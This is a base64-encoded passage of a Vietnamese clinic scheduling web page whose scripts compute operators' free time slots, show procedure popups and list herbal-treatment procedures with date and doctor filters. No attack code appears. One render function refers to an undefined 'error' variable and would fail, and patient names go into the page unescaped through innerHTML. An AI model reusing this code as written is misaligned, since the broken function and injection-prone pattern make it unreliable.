g0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uKCkgew0KICBjb25zdCBub2lkdW5nID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm5vaWR1bmciKTsNCiAgY29uc3QgbGlzdDEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIubGlzdDEiKTsNCg0KICBpZiAobm9pZHVuZyAmJiBsaXN0MSkgew0KICAgIGNvbnN0IHRleHQgPSBub2lkdW5nLnRleHRDb250ZW50IHx8IG5vaWR1bmcuaW5uZXJUZXh0IHx8ICIiOw0KICAgIGlmICh0ZXh0LnRyaW0oKSA9PT0gIiIpIHsNCiAgICAgIGxpc3QxLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KLy8gPT09PSBUw41OSCBUT8OBTiBHSeG7nCBUUuG7kE5HIENITyBU4buqTkcgTkfGr+G7nEkgPT09PQ0KDQoNCg0KZnVuY3Rpb24gdG9nZ2xlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eVRhYmxlJyk7DQogICAgY29uc3QgZmlsdGVyQmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5RmlsdGVyQmxvY2snKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCBncm91cHMgPSB7fTsNCiAgICBhbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2Mub3BlcmF0b3J9XyR7cHJvYy5kYXRlfWA7DQogICAgICAgIGlmICghZ3JvdXBzW2tleV0pIGdyb3Vwc1trZXldID0gW107DQogICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBzZWxlY3RlZE9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk/LnZhbHVlIHx8ICdhbGwnOw0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk/LnZhbHVlIHx8ICdhbGwnOw0KDQogICAgLy8gQ2jhu4kga2jhu59pIHThuqFvIGRyb3Bkb3duIDEgbOG6p24NCiAgICBpZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLm9wZXJhdG9yKSldLnNvcnQoKTsNCiAgICAgICAgY29uc3QgZGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCBvcFNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpOw0KICAgICAgICBjb25zdCBkYXRlU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKTsNCg0KICAgICAgICBvcFNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICAgICAgZGF0ZVNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBkYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIG9wU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgICAgIGRhdGVTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCg0KICAgICAgICBvcFNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgICAgICBkYXRlU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgfQ0KDQogICAgT2JqZWN0LmtleXMoZ3JvdXBzKS5mb3JFYWNoKGtleSA9PiB7DQogICAgICAgIGNvbnN0IFtvcGVyYXRvciwgZGF0ZV0gPSBrZXkuc3BsaXQoJ18nKTsNCiAgICAgICAgaWYgKChzZWxlY3RlZE9wICE9PSAnYWxsJyAmJiBvcGVyYXRvciAhPT0gc2VsZWN0ZWRPcCkgfHwNCiAgICAgICAgICAgIChzZWxlY3RlZERhdGUgIT09ICdhbGwnICYmIGRhdGUgIT09IHNlbGVjdGVkRGF0ZSkpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gZ3JvdXBzW2tleV07DQogICAgICAgIHByb2NlZHVyZXMuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdTdGFydCA9IDcgKiAzNjAwOw0KICAgICAgICBjb25zdCBtb3JuaW5nRW5kID0gMTEuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vblN0YXJ0ID0gMTMuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vbkVuZCA9IDE3ICogMzYwMDsNCg0KICAgICAgICBjb25zdCBtb3JuaW5nRnJlZSA9IGdldEZyZWVTbG90cyhwcm9jZWR1cmVzLCBtb3JuaW5nU3RhcnQsIG1vcm5pbmdFbmQpOw0KICAgICAgICBjb25zdCBhZnRlcm5vb25GcmVlID0gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIGFmdGVybm9vblN0YXJ0LCBhZnRlcm5vb25FbmQpOw0KDQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPjxhIGhyZWY9IiMiIG9uY2xpY2s9InNob3dQcm9jZWR1cmVzRm9yT3BlcmF0b3IoXGAke29wZXJhdG9yfVxgLCBcYCR7ZGF0ZX1cYCk7cmV0dXJuIGZhbHNlOyIgc3R5bGU9ImNvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+JHtvcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L2E+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2RhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke21vcm5pbmdGcmVlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHthZnRlcm5vb25GcmVlfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gZ2V0RnJlZVNsb3RzKHByb2NlZHVyZXMsIHN0YXJ0LCBlbmQpIHsNCiAgICBjb25zdCBidXN5ID0gcHJvY2VkdXJlcy5tYXAocCA9PiAoew0KICAgICAgICBzdGFydDogcC5zdGFydCwNCiAgICAgICAgZW5kOiBwLmVuZCArICgocC5wcm9jZWR1cmVJbmZvPy5idWZmZXIgfHwgMCkgKiA2MCkNCiAgICB9KSkuZmlsdGVyKHAgPT4gcC5lbmQgPiBzdGFydCAmJiBwLnN0YXJ0IDwgZW5kKTsNCg0KICAgIGJ1c3kuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgY29uc3QgZnJlZSA9IFtdOw0KICAgIGxldCBjdXJzb3IgPSBzdGFydDsNCg0KICAgIGZvciAoY29uc3QgYiBvZiBidXN5KSB7DQogICAgICAgIGlmIChiLnN0YXJ0ID4gY3Vyc29yICYmIGIuc3RhcnQgPiBzdGFydCAmJiBjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IGZyZWVTdGFydCA9IE1hdGgubWF4KGN1cnNvciwgc3RhcnQpOw0KICAgICAgICAgICAgY29uc3QgZnJlZUVuZCA9IE1hdGgubWluKGIuc3RhcnQsIGVuZCk7DQogICAgICAgICAgICBpZiAoZnJlZUVuZCA+IGZyZWVTdGFydCkgew0KICAgICAgICAgICAgICAgIGZyZWUucHVzaChgJHtmb3JtYXRUaW1lKGZyZWVTdGFydCl9IC0gJHtmb3JtYXRUaW1lKGZyZWVFbmQpfWApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGN1cnNvciA9IE1hdGgubWF4KGN1cnNvciwgYi5lbmQpOw0KICAgIH0NCg0KICAgIGlmIChjdXJzb3IgPCBlbmQpIHsNCiAgICAgICAgZnJlZS5wdXNoKGAke2Zvcm1hdFRpbWUoY3Vyc29yKX0gLSAke2Zvcm1hdFRpbWUoZW5kKX1gKTsNCiAgICB9DQoNCiAgICByZXR1cm4gZnJlZS5sZW5ndGggPyBmcmVlLmpvaW4oJzxicj4nKSA6ICc8aT5LaMO0bmcgY8OybiB0cuG7kW5nPC9pPic7DQp9DQoNCmZ1bmN0aW9uIGZvcm1hdFRpbWUoc2VjKSB7DQogICAgY29uc3QgaCA9IE1hdGguZmxvb3Ioc2VjIC8gMzYwMCk7DQogICAgY29uc3QgbSA9IE1hdGguZmxvb3IoKHNlYyAlIDM2MDApIC8gNjApOw0KICAgIHJldHVybiBoLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKSArICdoJyArIG0udG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpOw0KfQ0KDQpmdW5jdGlvbiBzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jyk7DQogICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwb3B1cENvbnRlbnQnKTsNCiAgICBjb25zdCBsaXN0ID0gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiBwLmRhdGUgPT09IGRhdGUpOw0KDQogICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxpPktow7RuZyB0w6xtIHRo4bqleSB0aOG7pyB0aHXhuq10PC9pPiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgbGlzdC5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9iPiAiICsgb3BlcmF0b3IgKyAiPGJyPjxiPk5nw6B5OjwvYj4gIiArIGRhdGUgKyAiPGJyPjxicj4iICsNCiAgICAgICAgICAgICI8dWwgc3R5bGU9J3BhZGRpbmctbGVmdDoyMHB4Jz4iICsgbGlzdC5tYXAocCA9PiANCiAgICAgICAgICAgICAgICAiPGxpPjxiPiIgKyBwLnBhdGllbnROYW1lICsgIjwvYj4gLSAiICsgcC5wcm9jZWR1cmUgKyAiICgiICsgcC5kaXNwbGF5U3RhcnQgKyAiIOKGkiAiICsgcC5kaXNwbGF5RW5kICsgIik8L2xpPiINCiAgICAgICAgICAgICkuam9pbignJykgKyAiPC91bD4iOw0KICAgIH0NCg0KICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCmZ1bmN0aW9uIGNsb3NlUHJvY2VkdXJlUG9wdXAoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KfQ0KPC9zY3JpcHQ+DQo8IS0tIFBvcHVwIHRo4bunIHRodeG6rXQgY2hpIHRp4bq/dCB24bubaSBvdmVybGF5IC0tPg0KPGRpdiBpZD0icHJvY2VkdXJlT3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC40KTt6LWluZGV4OjEwMDAwIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPg0KICA8ZGl2IGlkPSJwcm9jZWR1cmVQb3B1cCIgb25jbGljaz0iZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCkiIHN0eWxlPSJwb3NpdGlvbjpyZWxhdGl2ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlcjoycHggc29saWQgIzM0OThkYjtwYWRkaW5nOjIwcHg7Ym9yZGVyLXJhZGl1czo4cHg7Ym94LXNoYWRvdzowIDVweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTttYXgtaGVpZ2h0Ojcwdmg7b3ZlcmZsb3c6YXV0bztmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21heC13aWR0aDo2MDBweCI+DQogICAgPGgzPkNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdDwvaDM+DQogICAgPGRpdiBpZD0icG9wdXBDb250ZW50Ij48L2Rpdj4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gcmVuZGVySGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQoNCiAgICBpZiAoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAidHJ1ZSI7DQogICAgICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgICAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCg0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogICAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgICBjb25zdCBmaWx0ZXJlZEhlcmJzID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAgICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICAgICk7DQoNCiAgICBpZiAoZmlsdGVyZWRIZXJicy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD5gOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgZmlsdGVyZWRIZXJicy5mb3JFYWNoKHAgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5kYXRlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0g4oaSICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfSk7DQp9DQoNCg0KZnVuY3Rpb24gdG9nZ2xlSGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYgKHRhYmxlLnN0eWxlLmRpc3BsYXkgPT09ICdub25lJykgew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgcmVuZGVySGVyYkxpc3QoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIH0NCn0NCjwvc2NyaXB0Pg0KDQoNCg0KPHNjcmlwdD4NCihmdW5jdGlvbigpew0KICAvKiA9PT09IFRJ4buGTiDDjUNIIENIVeG6qE4gSE/DgSBUw4pOID09PT0gKi8NCiAgZnVuY3Rpb24gY2xlYW5EaXNwbGF5KG5hbWUpew0KICAgIHJldHVybiAobmFtZXx8JycpDQogICAgICAudG9TdHJpbmcoKQ0KICAgICAgLnJlcGxhY2UoL1ss77yMXStccyokLywnJykNCiAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAudHJpbSgpOw0KICB9DQogIGZ1bmN0aW9uIG5vcm0obmFtZSl7DQogICAgcmV0dXJuIGNsZWFuRGlzcGxheShuYW1lKS50b0xvd2VyQ2FzZSgpOw0KICB9DQoNCiAgLyogPT09PSBUw41OSCDEkEEgU+G7kCBUSEVPIE5Hw4BZID09PT0gKi8NCiAgZnVuY3Rpb24gY29tcHV0ZU1ham9yaXR5QnlEYXRlKHJvd3Mpew0KICAgIGNvbnN0IG1hcCA9IE9iamVjdC5jcmVhdGUobnVsbCk7DQogICAgcm93cy5mb3JFYWNoKHI9PnsNCiAgICAgIGNvbnN0IGQgPSByLmRhdGU7DQogICAgICBjb25zdCBuID0gbm9ybShyLm9wZXJhdG9yKTsNCiAgICAgIGlmKCFuIHx8IG4gPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOw0KICAgICAgKG1hcFtkXXx8KG1hcFtkXT17fSkpW25dID0gKG1hcFtkXVtuXXx8MCkrMTsNCiAgICB9KTsNCiAgICBjb25zdCBvdXQgPSB7fTsNCiAgICBPYmplY3Qua2V5cyhtYXApLmZvckVhY2goZD0+ew0KICAgICAgY29uc3QgYXJyID0gT2JqZWN0LmVudHJpZXMobWFwW2RdKS5zb3J0KChhLGIpPT5iWzFdLWFbMV0pOw0KICAgICAgY29uc3QgdG9wID0gYXJyWzBdIHx8IFtudWxsLDBdOw0KICAgICAgY29uc3Qgc2Vjb25kID0gYXJyWzFdIHx8IFtudWxsLDBdOw0KICAgICAgb3V0W2RdID0geyB0b3BOb3JtOnRvcFswXSwgdG9wQ291bnQ6dG9wWzFdLCBzZWNvbmRDb3VudDpzZWNvbmRbMV0gfTsNCiAgICB9KTsNCiAgICByZXR1cm4gb3V0Ow0KICB9DQoNCiAgLyogPT09PSBVSSBQSOG7pDogVMOTTSBU4bquVCArIFBPUFVQID09PT0gKi8NCiAgZnVuY3Rpb24gZW5zdXJlT3V0bGllclVJKCl7DQogICAgY29uc3Qgc3VtbWFyeSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgICBjb25zdCBtb2RhbCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWwnKTsNCiAgICBpZighc3VtbWFyeSkgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllclN1bW1hcnkgdHJvbmcgSFRNTCEnKTsNCiAgICBpZighbW9kYWwpICAgY29uc29sZS53YXJuKCdUaGnhur91ICNoZXJiT3V0bGllck1vZGFsIHRyb25nIEhUTUwhJyk7DQogICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQ2xvc2VCdG4nKTsNCiAgICBjb25zdCBiYWNrZHJvcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckJhY2tkcm9wJyk7DQogICAgaWYoYnRuKSBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+bW9kYWwuc3R5bGUuZGlzcGxheT0nbm9uZScpOw0KICAgIGlmKGJhY2tkcm9wKSBiYWNrZHJvcC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogIH0NCiAgZW5zdXJlT3V0bGllclVJKCk7DQoNCiAgLyogPT09PSBHSEkgxJDDiCBIw4BNIFJFTkRFUiA9PT09ICovDQovKiA9PT09IEdISSDEkMOIIEjDgE0gUkVOREVSID09PT0gKi8NCg0KLy8gaGVscGVyOiB0cuG6oyB24buBIGRhbmggc8OhY2ggbmfDoHkgY8OzIGNhIHPhuq9jIHRodeG7kWMgbOG7l2kNCmZ1bmN0aW9uIGdldEhlcmJFcnJvckRhdGVzKGFsbEhlcmJzKXsNCiAgY29uc3QgbWFqb3JpdHkgPSBjb21wdXRlTWFqb3JpdHlCeURhdGUoYWxsSGVyYnMpOw0KICBjb25zdCBkYXRlcyA9IG5ldyBTZXQoKTsNCg0KICBhbGxIZXJicy5mb3JFYWNoKGg9PnsNCiAgICBjb25zdCBtID0gbWFqb3JpdHlbaC5kYXRlXTsNCiAgICBjb25zdCBoYXNNYWpvcml0eSA9IG0gJiYgbS50b3BOb3JtICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50Ow0KICAgIGlmKGhhc01ham9yaXR5ICYmIGgub3BOb3JtICE9PSBtLnRvcE5vcm0pew0KICAgICAgZGF0ZXMuYWRkKGguZGF0ZSk7DQogICAgfQ0KICB9KTsNCg0KICByZXR1cm4gQXJyYXkuZnJvbShkYXRlcyk7DQp9DQoNCndpbmRvdy5yZW5kZXJIZXJiTGlzdCA9IGZ1bmN0aW9uKCl7DQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUYWJsZUJvZHknKTsNCiAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRvY3RvckZpbHRlcicpOw0KICBjb25zdCBzdW1tYXJ5RGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyU3VtbWFyeScpOw0KICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsJyk7DQogIGNvbnN0IG1vZGFsQm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsQm9keScpOw0KICBjb25zdCBtb2RhbEluZm8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbEluZm8nKTsNCiAgY29uc3Qgb25seUVycm9yRGF5c0NiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dIZXJiRXJyb3JEYXlzQ2hlY2tib3gnKTsNCg0KICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICBjb25zdCBoZXJic1J